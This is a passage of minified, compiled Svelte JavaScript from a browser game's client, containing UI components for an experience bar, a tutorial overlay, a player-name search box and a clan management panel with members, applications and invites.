        });
        return {
            c() {
                e = T("div"),
                    Ft(i.$$.fragment),
                    B(e, "id", "expbar"),
                    B(e, "class", "container svelte-16344pz")
            },
            m(t, n) {
                M(t, e, n),
                    Zt(i, e, null),
                    s = !0
            },
            p(t, [e]) {
                const s = {};
                1 & e && (s.fract = t[0]),
                    2 & e && (s.left = t[1]),
                    1 & e && (s.right = t[0] + "%"),
                    8 & e && (s.$$scope = {
                        dirty: e,
                        ctx: t
                    }),
                    i.$set(s)
            },
            i(t) {
                s || (Et(i.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(i.$$.fragment, t),
                    s = !1
            },
            d(t) {
                t && _(e),
                    Ut(i)
            }
        }
    }
    function PM(t, e, s) {
        let i, n, a;
        return m(t, ve, t => s(2, i = t)),
            t.$$.update = () => {
                4 & t.$$.dirty && (s(0, n = (100 * i.current / i.max).toFixed(2)),
                    s(1, a = `${Cb(i.current)} / ${Cb(i.max)} EXP`))
            }
            ,
            [n, a]
    }
    class IM extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, PM, TM, h, {})
        }
    }
    function DM(t) {
        let e, s, i, n, a, r, o, c, h, d = t[5].msg + "", u = t[5].fixed || t[5].step || t[5].fixed ? "Skip" : "Next", m = (t[5].fixed || t[5].step || t[5].fixed) && AM(t);
        return {
            c() {
                e = T("div"),
                    s = T("div"),
                    m && m.c(),
                    i = T("div"),
                    n = T("a"),
                    n.textContent = "Disable tutorial",
                    a = T("div"),
                    r = P(u),
                    B(s, "class", "textprimary msgtext svelte-1trgmuj"),
                    B(n, "class", "textgrey"),
                    B(a, "class", "textgreen"),
                    U(i, "display", "flex"),
                    U(i, "justify-content", "space-between"),
                    B(e, "class", o = "msg " + (t[5].complete ? "complete" : "") + " svelte-1trgmuj"),
                    U(e, "cursor", "pointer")
            },
            m(o, u, p) {
                M(o, e, u),
                    E(e, s),
                    s.innerHTML = d,
                    m && m.m(e, null),
                    E(e, i),
                    E(i, n),
                    E(i, a),
                    E(a, r),
                    c = !0,
                    p && l(h),
                    h = [A(n, "click", t[6]), A(e, "click", t[7])]
            },
            p(t, n) {
                (!c || 32 & n) && d !== (d = t[5].msg + "") && (s.innerHTML = d),
                    t[5].fixed || t[5].step || t[5].fixed ? m ? (m.p(t, n),
                        32 & n && Et(m, 1)) : (m = AM(t),
                            m.c(),
                            Et(m, 1),
                            m.m(e, i)) : m && ($t(),
                                Mt(m, 1, 1, () => {
                                    m = null
                                }
                                ),
                                St()),
                    (!c || 32 & n) && u !== (u = t[5].fixed || t[5].step || t[5].fixed ? "Skip" : "Next") && F(r, u),
                    (!c || 32 & n && o !== (o = "msg " + (t[5].complete ? "complete" : "") + " svelte-1trgmuj")) && B(e, "class", o)
            },
            i(t) {
                c || (Et(m),
                    c = !0)
            },
            o(t) {
                Mt(m),
                    c = !1
            },
            d(t) {
                t && _(e),
                    m && m.d(),
                    l(h)
            }
        }
    }
    function AM(t) {
        let e;
        const s = new Vb({
            props: {
                size: "0.8em",
                fract: t[5].GF,
                barcol: "bgtut",
                left: "",
                right: Math.ceil(t[5].GF) + "%"
            }
        });
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, e) {
                const i = {};
                32 & e && (i.fract = t[5].GF),
                    32 & e && (i.right = Math.ceil(t[5].GF) + "%"),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function BM(t) {
        let e, s;
        return {
            c() {
                e = T("div"),
                    B(e, "class", s = "border skill tut " + (t[5].complete ? "complete" : "") + " svelte-1trgmuj"),
                    U(e, "top", t[2] + "px"),
                    U(e, "left", t[1] + "px"),
                    U(e, "width", t[3] + "px"),
                    U(e, "height", t[4] + "px")
            },
            m(t, s) {
                M(t, e, s)
            },
            p(t, i) {
                32 & i && s !== (s = "border skill tut " + (t[5].complete ? "complete" : "") + " svelte-1trgmuj") && B(e, "class", s),
                    4 & i && U(e, "top", t[2] + "px"),
                    2 & i && U(e, "left", t[1] + "px"),
                    8 & i && U(e, "width", t[3] + "px"),
                    16 & i && U(e, "height", t[4] + "px")
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function RM(t) {
        let e, s, i, n = t[5] && t[5].msg && DM(t), a = t[0] && BM(t);
        return {
            c() {
                n && n.c(),
                    e = D(),
                    a && a.c(),
                    s = D()
            },
            m(t, r) {
                n && n.m(t, r),
                    M(t, e, r),
                    a && a.m(t, r),
                    M(t, s, r),
                    i = !0
            },
            p(t, [i]) {
                t[5] && t[5].msg ? n ? (n.p(t, i),
                    32 & i && Et(n, 1)) : (n = DM(t),
                        n.c(),
                        Et(n, 1),
                        n.m(e.parentNode, e)) : n && ($t(),
                            Mt(n, 1, 1, () => {
                                n = null
                            }
                            ),
                            St()),
                    t[0] ? a ? a.p(t, i) : (a = BM(t),
                        a.c(),
                        a.m(s.parentNode, s)) : a && (a.d(1),
                            a = null)
            },
            i(t) {
                i || (Et(n),
                    i = !0)
            },
            o(t) {
                Mt(n),
                    i = !1
            },
            d(t) {
                n && n.d(t),
                    t && _(e),
                    a && a.d(t),
                    t && _(s)
            }
        }
    }
    function zM(t, e, s) {
        let i;
        m(t, $e, t => s(5, i = t));
        let n, a, r, o, l = !1;
        return $e.subscribe(t => {
            if (t) {
                const e = document.getElementById(t.element);
                if (e) {
                    s(0, l = !0);
                    const t = e.getBoundingClientRect();
                    s(3, r = t.width + 10),
                        s(4, o = t.height + 10),
                        s(1, n = t.x - 5),
                        s(2, a = t.y - 5)
                } else
                    s(0, l = !1)
            } else
                s(0, l = !1)
        }
        ),
            [l, n, a, r, o, i, t => Ts.set(1e3), t => {
                ib(-1, 100)
            }
            ]
    }
    class FM extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, zM, RM, h, {})
        }
    }
    const ZM = async (t, e, s) => {
        const i = await fetch(t, {
            method: void 0 !== e ? "POST" : "GET",
            body: e ? JSON.stringify(e) : void 0
        });
        return 500 === i.status ? s(await i.text()) : await i.json()
    }
        , UM = t => 50 * Math.round((10 + 5 * t) ** 1.85 / 50)
        , LM = t => Math.min(100, 8 + 2 * t)
        , NM = (t, e = 200) => {
            let s = void 0;
            return (i, n) => {
                s && clearTimeout(s),
                    s = setTimeout(e => t(i), null == n ? e : n)
            }
        }
        ;
    function OM(t, e, s) {
        const i = t.slice();
        return i[16] = e[s],
            i[18] = s,
            i
    }
    function jM(t) {
        let e, s, i, n = t[1], a = [];
        for (let e = 0; e < n.length; e += 1)
            a[e] = XM(OM(t, n, e));
        const r = t => Mt(a[t], 1, 1, () => {
            a[t] = null
        }
        );
        let o = null;
        return n.length || (o = qM()),
        {
            c() {
                e = T("div");
                for (let t = 0; t < a.length; t += 1)
                    a[t].c();
                s = D(),
                    o && o.c(),
                    B(e, "class", "divider svelte-1pxrrpt")
            },
            m(t, n) {
                M(t, e, n);
                for (let e = 0; e < a.length; e += 1)
                    a[e].m(t, n);
                M(t, s, n),
                    o && o.m(t, n),
                    i = !0
            },
            p(t, e) {
                if (74 & e) {
                    let i;
                    for (n = t[1],
                        i = 0; i < n.length; i += 1) {
                        const r = OM(t, n, i);
                        a[i] ? (a[i].p(r, e),
                            Et(a[i], 1)) : (a[i] = XM(r),
                                a[i].c(),
                                Et(a[i], 1),
                                a[i].m(s.parentNode, s))
                    }
                    for ($t(),
                        i = n.length; i < a.length; i += 1)
                        r(i);
                    St(),
                        n.length ? o && (o.d(1),
                            o = null) : o || (o = qM(),
                                o.c(),
                                o.m(s.parentNode, s))
                }
            },
            i(t) {
                if (!i) {
                    for (let t = 0; t < n.length; t += 1)
                        Et(a[t]);
                    i = !0
                }
            },
            o(t) {
                a = a.filter(Boolean);
                for (let t = 0; t < a.length; t += 1)
                    Mt(a[t]);
                i = !1
            },
            d(t) {
                t && _(e),
                    C(a, t),
                    t && _(s),
                    o && o.d(t)
            }
        }
    }
    function qM(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    e.textContent = "No results",
                    B(e, "class", "textgrey result svelte-1pxrrpt")
            },
            m(t, s) {
                M(t, e, s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function XM(t) {
        let e, s, i, n;
        const r = [t[16]];
        let o = {};
        for (let t = 0; t < r.length; t += 1)
            o = a(o, r[t]);
        const l = new Ap({
            props: o
        });
        function c(...e) {
            return t[15](t[18], ...e)
        }
        return {
            c() {
                e = T("div"),
                    Ft(l.$$.fragment),
                    B(e, "class", s = "result " + (t[18] === t[3] ? "sel" : "") + " svelte-1pxrrpt")
            },
            m(t, s, a) {
                M(t, e, s),
                    Zt(l, e, null),
                    i = !0,
                    a && n(),
                    n = A(e, "mousedown", c)
            },
            p(n, a) {
                t = n;
                const o = 2 & a ? Bt(r, [Rt(t[16])]) : {};
                l.$set(o),
                    (!i || 8 & a && s !== (s = "result " + (t[18] === t[3] ? "sel" : "") + " svelte-1pxrrpt")) && B(e, "class", s)
            },
            i(t) {
                i || (Et(l.$$.fragment, t),
                    i = !0)
            },
            o(t) {
                Mt(l.$$.fragment, t),
                    i = !1
            },
            d(t) {
                t && _(e),
                    Ut(l),
                    n()
            }
        }
    }
    function HM(t) {
        let e, s, i, n, a, r, o = t[2] && jM(t);
        return {
            c() {
                e = T("div"),
                    s = T("div"),
                    i = T("input"),
                    o && o.c(),
                    B(i, "placeholder", "Enter player name"),
                    B(i, "type", "text"),
                    B(i, "class", "svelte-1pxrrpt"),
                    B(s, "class", n = "container input " + (t[2] ? "focus" : "") + " svelte-1pxrrpt"),
                    B(e, "class", "navbtn wrapper svelte-1pxrrpt")
            },
            m(n, c, h) {
                M(n, e, c),
                    E(e, s),
                    E(s, i),
                    t[11](i),
                    Z(i, t[0]),
                    o && o.m(s, null),
                    a = !0,
                    h && l(r),
                    r = [A(i, "input", t[12]), A(i, "input", t[5]), A(i, "focus", t[13]), A(i, "blur", t[14])]
            },
            p(t, [e]) {
                1 & e && i.value !== t[0] && Z(i, t[0]),
                    t[2] ? o ? (o.p(t, e),
                        4 & e && Et(o, 1)) : (o = jM(t),
                            o.c(),
                            Et(o, 1),
                            o.m(s, null)) : o && ($t(),
                                Mt(o, 1, 1, () => {
                                    o = null
                                }
                                ),
                                St()),
                    (!a || 4 & e && n !== (n = "container input " + (t[2] ? "focus" : "") + " svelte-1pxrrpt")) && B(s, "class", n)
            },
            i(t) {
                a || (Et(o),
                    a = !0)
            },
            o(t) {
                Mt(o),
                    a = !1
            },
            d(s) {
                s && _(e),
                    t[11](null),
                    o && o.d(),
                    l(r)
            }
        }
    }
    function KM(t, e, s) {
        const i = NM(async () => {
            s(1, c = await ZM("api/playerinfo/search", {
                [o]: r,
                order: "name",
                limit: l
            })),
                u(c.findIndex(t => t.name.toLowerCase() == r.toLowerCase()))
        }
        );
        let n, a, { name: r = "" } = e, { type: o = "name" } = e, { limit: l = 5 } = e, c = [], h = !1, d = -1;
        const u = t => {
            s(3, d = t),
                d >= 0 && (n = c[d],
                    s(0, r = n.name))
        }
            , m = t => {
                t.target == a && (38 !== t.keyCode && 40 !== t.keyCode || !c.length ? 13 != t.keyCode && 27 != t.keyCode || a.blur() : (u(ar(d + (38 === t.keyCode ? -1 : 1), c.length)),
                    t.preventDefault()))
            }
            ;
        function p(t) {
            at[t ? "unshift" : "push"](() => {
                s(4, a = t)
            }
            )
        }
        function f() {
            r = this.value,
                s(0, r)
        }
        J(() => {
            document.addEventListener("keydown", m)
        }
        ),
            et(() => {
                document.removeEventListener("keydown", m),
                    s(4, a = void 0)
            }
            );
        const g = t => s(2, h = !0)
            , v = t => s(2, h = !1)
            , y = (t, e) => u(t);
        return t.$set = t => {
            "name" in t && s(0, r = t.name),
                "type" in t && s(7, o = t.type),
                "limit" in t && s(8, l = t.limit)
        }
            ,
            [r, c, h, d, a, i, u, o, l, n, m, p, f, g, v, y]
    }
    class WM extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, KM, HM, h, {
                    name: 0,
                    type: 7,
                    limit: 8
                })
        }
    }
    function YM(t, e, s) {
        const i = t.slice();
        return i[24] = e[s],
            i[23] = s,
            i
    }
    function VM(t, e, s) {
        const i = t.slice();
        return i[21] = e[s],
            i[23] = s,
            i
    }
    function GM(t, e, s) {
        const i = t.slice();
        return i[26] = e[s],
            i[23] = s,
            i
    }
    function QM(t) {
        let e, s, i, n, a, r, o, l, c, h, d, u, m, p, f, g, v, y, b, w, x, k, $, S, C, I, R, z, Z, U, L, N, O, j, q, X, H, K, W, Y, V, G, Q, J, tt, et, st, it, nt, at, rt, ot, lt, ct, ht = t[0].tag + "", dt = t[0].name + "", ut = Xi.factions[t[0].faction].name + "", mt = t[0].level + "", pt = LM(t[0].level) + "", ft = LM(t[0].level + 1) - LM(t[0].level) + "", gt = t[0].tax + "", vt = t[0].members.length + "", yt = `${t[0].online} (+${60 * t[0].online} EXP/h)`, bt = t[0].fame + "";
        const wt = new Vb({
            props: {
                size: "1em",
                fract: Math.ceil(t[0].exp / UM(t[0].level) * 100),
                barcol: "bgpurp",
                left: `${t[0].exp} / ${UM(t[0].level)}`,
                right: Math.ceil(t[0].exp / UM(t[0].level) * 100) + "%"
            }
        })
            , xt = new nk({
                props: {
                    amount: t[0].gold
                }
            });
        let kt = t[0].role > -1 && JM(t)
            , _t = t[0].role > 0 && t_(t)
            , Ct = t[0].eligibleApply.length > 0 && e_(t)
            , Tt = t[1] && i_(t)
            , Pt = t[0].role > 0 && n_(t);
        const It = [r_, a_]
            , Dt = [];
        function At(t, e) {
            return "members" == t[6] ? 0 : "applications" == t[6] ? 1 : -1
        }
        return ~(at = At(t)) && (rt = Dt[at] = It[at](t)),
        {
            c() {
                e = T("div"),
                    s = T("img"),
                    n = T("div"),
                    a = T("div"),
                    r = T("h1"),
                    o = P(ht),
                    l = T("h3"),
                    c = P(dt),
                    d = T("p"),
                    u = P(ut),
                    m = P(" Clan"),
                    p = T("div"),
                    Ft(wt.$$.fragment),
                    f = T("div"),
                    g = T("div"),
                    v = T("div"),
                    y = T("span"),
                    y.textContent = "Clan Level",
                    b = T("span"),
                    w = P(mt),
                    x = T("span"),
                    x.textContent = "Capacity",
                    k = T("span"),
                    $ = P(pt),
                    S = T("span"),
                    S.textContent = "Next Level",
                    C = T("span"),
                    I = P("+"),
                    R = P(ft),
                    z = P(" Capacity"),
                    Z = T("span"),
                    Z.textContent = "Tax rate",
                    U = T("span"),
                    L = P(gt),
                    N = P("%"),
                    O = T("div"),
                    j = T("div"),
                    q = T("span"),
                    q.textContent = "Members",
                    X = T("span"),
                    H = P(vt),
                    K = T("span"),
                    K.textContent = "Online",
                    W = T("span"),
                    Y = P(yt),
                    V = T("span"),
                    V.textContent = "Fame",
                    G = T("span"),
                    Q = P(bt),
                    J = T("span"),
                    J.textContent = "Treasury",
                    Ft(xt.$$.fragment),
                    kt && kt.c(),
                    tt = D(),
                    _t && _t.c(),
                    et = D(),
                    Ct && Ct.c(),
                    st = D(),
                    Tt && Tt.c(),
                    it = T("div"),
                    nt = T("div"),
                    nt.textContent = "Members",
                    Pt && Pt.c(),
                    rt && rt.c(),
                    ot = D(),
                    B(s, "class", "helmet absCentered svelte-6t8hqd"),
                    s.src !== (i = "/assets/ui/factions/" + t[0].faction + ".svg?v=4002247") && B(s, "src", i),
                    B(a, "class", h = "textf" + t[0].faction + " svelte-6t8hqd"),
                    B(n, "class", "textcenter"),
                    B(e, "class", "hero svelte-6t8hqd"),
                    B(p, "class", "panel-black svelte-6t8hqd"),
                    B(y, "class", "textprimary"),
                    B(x, "class", "textprimary"),
                    B(S, "class", "textprimary"),
                    B(Z, "class", "textprimary"),
                    B(v, "class", "panel-black grid two svelte-6t8hqd"),
                    B(q, "class", "textprimary"),
                    B(K, "class", "textprimary"),
                    B(V, "class", "textprimary"),
                    B(J, "class", "textprimary"),
                    B(j, "class", "panel-black grid two svelte-6t8hqd"),
                    B(f, "class", "marg-top grid two"),
                    B(nt, "class", "btn navbtn grey"),
                    B(it, "class", "subnav")
            },
            m(i, h, _) {
                M(i, e, h),
                    E(e, s),
                    E(e, n),
                    E(n, a),
                    E(a, r),
                    E(r, o),
                    E(a, l),
                    E(l, c),
                    E(n, d),
                    E(d, u),
                    E(d, m),
                    M(i, p, h),
                    Zt(wt, p, null),
                    M(i, f, h),
                    E(f, g),
                    E(g, v),
                    E(v, y),
                    E(v, b),
                    E(b, w),
                    E(v, x),
                    E(v, k),
                    E(k, $),
                    E(v, S),
                    E(v, C),
                    E(C, I),
                    E(C, R),
                    E(C, z),
                    E(v, Z),
                    E(v, U),
                    E(U, L),
                    E(U, N),
                    E(f, O),
                    E(O, j),
                    E(j, q),
                    E(j, X),
                    E(X, H),
                    E(j, K),
                    E(j, W),
                    E(W, Y),
                    E(j, V),
                    E(j, G),
                    E(G, Q),
                    E(j, J),
                    Zt(xt, j, null),
                    kt && kt.m(i, h),
                    M(i, tt, h),
                    _t && _t.m(i, h),
                    M(i, et, h),
                    Ct && Ct.m(i, h),
                    M(i, st, h),
                    Tt && Tt.m(i, h),
                    M(i, it, h),
                    E(it, nt),
                    Pt && Pt.m(it, null),
                    ~at && Dt[at].m(i, h),
                    M(i, ot, h),
                    lt = !0,
                    _ && ct(),
                    ct = A(nt, "click", t[17])
            },
            p(t, e) {
                (!lt || 1 & e && s.src !== (i = "/assets/ui/factions/" + t[0].faction + ".svg?v=4002247")) && B(s, "src", i),
                    (!lt || 1 & e) && ht !== (ht = t[0].tag + "") && F(o, ht),
                    (!lt || 1 & e) && dt !== (dt = t[0].name + "") && F(c, dt),
                    (!lt || 1 & e && h !== (h = "textf" + t[0].faction + " svelte-6t8hqd")) && B(a, "class", h),
                    (!lt || 1 & e) && ut !== (ut = Xi.factions[t[0].faction].name + "") && F(u, ut);
                const n = {};
                1 & e && (n.fract = Math.ceil(t[0].exp / UM(t[0].level) * 100)),
                    1 & e && (n.left = `${t[0].exp} / ${UM(t[0].level)}`),
                    1 & e && (n.right = Math.ceil(t[0].exp / UM(t[0].level) * 100) + "%"),
                    wt.$set(n),
                    (!lt || 1 & e) && mt !== (mt = t[0].level + "") && F(w, mt),
                    (!lt || 1 & e) && pt !== (pt = LM(t[0].level) + "") && F($, pt),
                    (!lt || 1 & e) && ft !== (ft = LM(t[0].level + 1) - LM(t[0].level) + "") && F(R, ft),
                    (!lt || 1 & e) && gt !== (gt = t[0].tax + "") && F(L, gt),
                    (!lt || 1 & e) && vt !== (vt = t[0].members.length + "") && F(H, vt),
                    (!lt || 1 & e) && yt !== (yt = `${t[0].online} (+${60 * t[0].online} EXP/h)`) && F(Y, yt),
                    (!lt || 1 & e) && bt !== (bt = t[0].fame + "") && F(Q, bt);
                const r = {};
                1 & e && (r.amount = t[0].gold),
                    xt.$set(r),
                    t[0].role > -1 ? kt ? kt.p(t, e) : (kt = JM(t),
                        kt.c(),
                        kt.m(tt.parentNode, tt)) : kt && (kt.d(1),
                            kt = null),
                    t[0].role > 0 ? _t ? (_t.p(t, e),
                        1 & e && Et(_t, 1)) : (_t = t_(t),
                            _t.c(),
                            Et(_t, 1),
                            _t.m(et.parentNode, et)) : _t && ($t(),
                                Mt(_t, 1, 1, () => {
                                    _t = null
                                }
                                ),
                                St()),
                    t[0].eligibleApply.length > 0 ? Ct ? Ct.p(t, e) : (Ct = e_(t),
                        Ct.c(),
                        Ct.m(st.parentNode, st)) : Ct && (Ct.d(1),
                            Ct = null),
                    t[1] ? Tt ? Tt.p(t, e) : (Tt = i_(t),
                        Tt.c(),
                        Tt.m(it.parentNode, it)) : Tt && (Tt.d(1),
                            Tt = null),
                    t[0].role > 0 ? Pt ? Pt.p(t, e) : (Pt = n_(t),
                        Pt.c(),
                        Pt.m(it, null)) : Pt && (Pt.d(1),
                            Pt = null);
                let l = at;
                at = At(t),
                    at === l ? ~at && Dt[at].p(t, e) : (rt && ($t(),
                        Mt(Dt[l], 1, 1, () => {
                            Dt[l] = null
                        }
                        ),
                        St()),
                        ~at ? (rt = Dt[at],
                            rt || (rt = Dt[at] = It[at](t),
                                rt.c()),
                            Et(rt, 1),
                            rt.m(ot.parentNode, ot)) : rt = null)
            },
            i(t) {
                lt || (Et(wt.$$.fragment, t),
                    Et(xt.$$.fragment, t),
                    Et(_t),
                    Et(rt),
                    lt = !0)
            },
            o(t) {
                Mt(wt.$$.fragment, t),
                    Mt(xt.$$.fragment, t),
                    Mt(_t),
                    Mt(rt),
                    lt = !1
            },
            d(t) {
                t && _(e),
                    t && _(p),
                    Ut(wt),
                    t && _(f),
                    Ut(xt),
                    kt && kt.d(t),
                    t && _(tt),
                    _t && _t.d(t),
                    t && _(et),
                    Ct && Ct.d(t),
                    t && _(st),
                    Tt && Tt.d(t),
                    t && _(it),
                    Pt && Pt.d(),
                    ~at && Dt[at].d(t),
                    t && _(ot),
                    ct()
            }
        }
    }
    function JM(t) {
        let e, s, i, n, a = Xi.ui.clan.roles[t[0].role] + "";
        return {
            c() {
                e = T("div"),
                    s = T("span"),
                    s.textContent = "Your highest rank: ",
                    i = T("span"),
                    n = P(a),
                    B(s, "class", "textprimary"),
                    B(i, "class", "textgreen"),
                    B(e, "class", "marg-top panel-black svelte-6t8hqd")
            },
            m(t, a) {
                M(t, e, a),
                    E(e, s),
                    E(e, i),
                    E(i, n)
            },
            p(t, e) {
                1 & e && a !== (a = Xi.ui.clan.roles[t[0].role] + "") && F(n, a)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function t_(t) {
        let e, s, i, n, a, r, o, l, c;
        function h(e) {
            t[15].call(null, e)
        }
        let d = {};
        void 0 !== t[4] && (d.name = t[4]);
        const u = new WM({
            props: d
        });
        return at.push(() => zt(u, "name", h)),
        {
            c() {
                e = T("div"),
                    s = T("span"),
                    s.textContent = "Invite players",
                    i = T("div"),
                    Ft(u.$$.fragment),
                    a = T("div"),
                    r = P("Invite player"),
                    B(s, "class", "textgrey"),
                    B(a, "class", o = "btn formatted navbtn grey " + (t[3] || !t[4].length ? "disabled" : "")),
                    B(i, "class", "subnav"),
                    B(e, "class", "marg-top panel-black svelte-6t8hqd")
            },
            m(n, o, h) {
                M(n, e, o),
                    E(e, s),
                    E(e, i),
                    Zt(u, i, null),
                    E(i, a),
                    E(a, r),
                    l = !0,
                    h && c(),
                    c = A(a, "click", t[8])
            },
            p(t, e) {
                const s = {};
                !n && 16 & e && (n = !0,
                    s.name = t[4],
                    mt(() => n = !1)),
                    u.$set(s),
                    (!l || 24 & e && o !== (o = "btn formatted navbtn grey " + (t[3] || !t[4].length ? "disabled" : ""))) && B(a, "class", o)
            },
            i(t) {
                l || (Et(u.$$.fragment, t),
                    l = !0)
            },
            o(t) {
                Mt(u.$$.fragment, t),
                    l = !1
            },
            d(t) {
                t && _(e),
                    Ut(u),
                    c()
            }
        }
    }
    function e_(t) {
        let e, s, i, n, a, r, o, c, h = t[0].eligibleApply, d = [];
        for (let e = 0; e < h.length; e += 1)
            d[e] = s_(GM(t, h, e));
        return {
            c() {
                e = T("div"),
                    s = T("span"),
                    s.textContent = "Apply to clan (request invitation)",
                    i = T("div"),
                    n = T("select");
                for (let t = 0; t < d.length; t += 1)
                    d[t].c();
                a = T("div"),
                    r = P("Apply"),
                    B(s, "class", "textgrey"),
                    B(n, "class", "navbtn"),
                    void 0 === t[5] && ut(() => t[16].call(n)),
                    B(a, "class", o = "btn formatted navbtn grey " + (t[3] || !t[5].length ? "disabled" : "")),
                    B(i, "class", "subnav"),
                    B(e, "class", "marg-top panel-black svelte-6t8hqd")
            },
            m(o, h, u) {
                M(o, e, h),
                    E(e, s),
                    E(e, i),
                    E(i, n);
                for (let t = 0; t < d.length; t += 1)
                    d[t].m(n, null);
                L(n, t[5]),
                    E(i, a),
                    E(a, r),
                    u && l(c),
                    c = [A(n, "change", t[16]), A(a, "click", t[9])]
            },
            p(t, e) {
                if (33 & e) {
                    let s;
                    for (h = t[0].eligibleApply,
                        s = 0; s < h.length; s += 1) {
                        const i = GM(t, h, s);
                        d[s] ? d[s].p(i, e) : (d[s] = s_(i),
                            d[s].c(),
                            d[s].m(n, null))
                    }
                    for (; s < d.length; s += 1)
                        d[s].d(1);
                    d.length = h.length
                }
                32 & e && L(n, t[5]),
                    40 & e && o !== (o = "btn formatted navbtn grey " + (t[3] || !t[5].length ? "disabled" : "")) && B(a, "class", o)
            },
            d(t) {
                t && _(e),
                    C(d, t),
                    l(c)
            }
        }
    }
    function s_(t) {
        let e, s, i, n, a = t[26] + "";
        return {
            c() {
                e = T("option"),
                    s = P(a),
                    e.selected = i = t[5] == t[26],
                    e.__value = n = t[26],
                    e.value = e.__value
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p(t, r) {
                1 & r && a !== (a = t[26] + "") && F(s, a),
                    33 & r && i !== (i = t[5] == t[26]) && (e.selected = i),
                    1 & r && n !== (n = t[26]) && (e.__value = n),
                    e.value = e.__value
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function i_(t) {
        let e, s, i, n, a;
        return {
            c() {
                e = T("div"),
                    s = T("span"),
                    i = P(t[1]),
                    B(s, "class", n = "text" + t[2] + " svelte-6t8hqd"),
                    B(e, "class", a = "marg-top panel-black border " + t[2] + " svelte-6t8hqd")
            },
            m(t, n) {
                M(t, e, n),
                    E(e, s),
                    E(s, i)
            },
            p(t, r) {
                2 & r && F(i, t[1]),
                    4 & r && n !== (n = "text" + t[2] + " svelte-6t8hqd") && B(s, "class", n),
                    4 & r && a !== (a = "marg-top panel-black border " + t[2] + " svelte-6t8hqd") && B(e, "class", a)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function n_(t) {
        let e, s, i, n, a, r, o = t[0].applications.length + "";
        return {
            c() {
                e = T("div"),
                    s = P("Applications ("),
                    i = P(o),
                    n = P(")"),
                    a = I(),
                    B(e, "class", "btn navbtn grey")
            },
            m(o, l, c) {
                M(o, e, l),
                    E(e, s),
                    E(e, i),
                    E(e, n),
                    M(o, a, l),
                    c && r(),
                    r = A(e, "click", t[18])
            },
            p(t, e) {
                1 & e && o !== (o = t[0].applications.length + "") && F(i, o)
            },
            d(t) {
                t && _(e),
                    t && _(a),
                    r()
            }
        }
    }
    function a_(t) {
        let e, s, i, n, a, r = [], o = new Map, l = t[0].applications;
        const c = t => t[24].name;
        for (let e = 0; e < l.length; e += 1) {
            let s = YM(t, l, e)
                , i = c(s);
            o.set(i, r[e] = o_(i, s))
        }
        return {
            c() {
                e = T("div"),
                    e.textContent = "This is a list of active applications to your clan. Right click to accept an application and invite the player to your clan",
                    s = T("table"),
                    i = T("thead"),
                    i.innerHTML = '<tr class="textprimary"><th width="70%">Player</th></tr>',
                    n = T("tbody");
                for (let t = 0; t < r.length; t += 1)
                    r[t].c();
                B(e, "class", "marg-top textgrey"),
                    B(s, "class", "marg-top panel-black svelte-6t8hqd")
            },
            m(t, o) {
                M(t, e, o),
                    M(t, s, o),
                    E(s, i),
                    E(s, n);
                for (let t = 0; t < r.length; t += 1)
                    r[t].m(n, null);
                a = !0
            },
            p(t, e) {
                if (1025 & e) {
                    const s = t[0].applications;
                    $t(),
                        r = At(r, e, c, 1, t, s, o, n, Dt, o_, null, YM),
                        St()
                }
            },
            i(t) {
                if (!a) {
                    for (let t = 0; t < l.length; t += 1)
                        Et(r[t]);
                    a = !0
                }
            },
            o(t) {
                for (let t = 0; t < r.length; t += 1)
                    Mt(r[t]);
                a = !1
            },
            d(t) {
                t && _(e),
                    t && _(s);
                for (let t = 0; t < r.length; t += 1)
                    r[t].d()
            }
        }
    }
    function r_(t) {
        let e, s, i, n, a, r = [], o = new Map, l = t[0].members;
        const c = t => t[21].name;
        for (let e = 0; e < l.length; e += 1) {
            let s = VM(t, l, e)
                , i = c(s);
            o.set(i, r[e] = l_(i, s))
        }
        return {
            c() {
                e = T("div"),
                    e.textContent = "This is a list of active members of this clan. Right click the members for additional options.",
                    s = T("table"),
                    i = T("thead"),
                    i.innerHTML = '<tr class="textprimary"><th width="70%">Member</th><th>Rank</th></tr>',
                    n = T("tbody");
                for (let t = 0; t < r.length; t += 1)
                    r[t].c();
                B(e, "class", "marg-top textgrey"),
                    B(s, "class", "marg-top panel-black svelte-6t8hqd")
            },
            m(t, o) {
                M(t, e, o),
                    M(t, s, o),
                    E(s, i),
                    E(s, n);
                for (let t = 0; t < r.length; t += 1)
                    r[t].m(n, null);
                a = !0
            },
            p(t, e) {
                if (129 & e) {
                    const s = t[0].members;
                    $t(),
                        r = At(r, e, c, 1, t, s, o, n, Dt, l_, null, VM),
                        St()
                }
            },
            i(t) {
                if (!a) {
                    for (let t = 0; t < l.length; t += 1)
                        Et(r[t]);
                    a = !0
                }
            },
            o(t) {
                for (let t = 0; t < r.length; t += 1)
                    Mt(r[t]);
                a = !1
            },
            d(t) {
                t && _(e),
                    t && _(s);
                for (let t = 0; t < r.length; t += 1)
                    r[t].d()
            }
        }
    }
    function o_(t, e) {
        let s, i, n, a;
        const r = new Ap({
            props: {
                name: e[24].name,
                pclass: e[24].class,
                level: e[24].level,
                faction: e[0].faction
            }
        });
        function o(...t) {
            return e[20](e[24], ...t)
        }
        return {
            key: t,
            first: null,
            c() {
                s = T("tr"),
                    i = T("td"),
                    Ft(r.$$.fragment),
                    B(s, "class", "striped"),
                    this.first = s
            },
            m(t, e, l) {
                M(t, s, e),
                    E(s, i),
                    Zt(r, i, null),
                    n = !0,
                    l && a(),
                    a = A(s, "mousedown", o)
            },
            p(t, s) {
                e = t;
                const i = {};
                1 & s && (i.name = e[24].name),
                    1 & s && (i.pclass = e[24].class),
                    1 & s && (i.level = e[24].level),
                    1 & s && (i.faction = e[0].faction),
                    r.$set(i)
            },
